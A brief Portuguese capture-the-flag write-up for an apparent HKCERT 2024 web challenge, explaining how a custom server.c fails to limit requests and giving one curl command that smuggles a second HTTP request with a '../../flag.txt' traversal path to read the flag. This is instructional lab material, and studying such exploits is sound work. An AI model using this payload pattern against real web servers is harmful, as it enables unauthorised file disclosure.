# Meu Servidor - Reunião de 03/04

###### Solved by @beatriz-a-cardozo

## About the Challenge

O desafio consiste em um website simples chamado 'High Knowledge Preparatory School', com a ideia de explorarmos uma vulnerabilidade Web através de path transversal.

## Solution

Para esse deafio, temos um blog simples sobre tecnologia. A vulnerabilidade se encontra ao analisarmos o código do servidor disponível `server.c`, podemos ver que ele não verifica o limite de requisições, então é possível mandar mais de uma requisição HTTP. Essa vulnerabilidade é conhecida como **HTTP Request Smugling**.


````
curl -v --http1.1 http://localhost:8081 \
  -H "Host: localhost" \
  -H "Content-Length: 1024" \
  -H "Foo: $(python3 -c 'print("a"*931)')" \
  --data-binary $'GET /'$(python3 -c 'print("/"*(1016-len("../../flag.txt")) + "../../flag.txt.js")')$'GET /index.html HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n\r\n'
````


[![Captura-de-tela-2025-04-10-161949.png](https://i.postimg.cc/C1pJNR7x/Captura-de-tela-2025-04-10-161949.png)](https://postimg.cc/Lqvz46Gc)

>hkcert24{***REDACTED***}
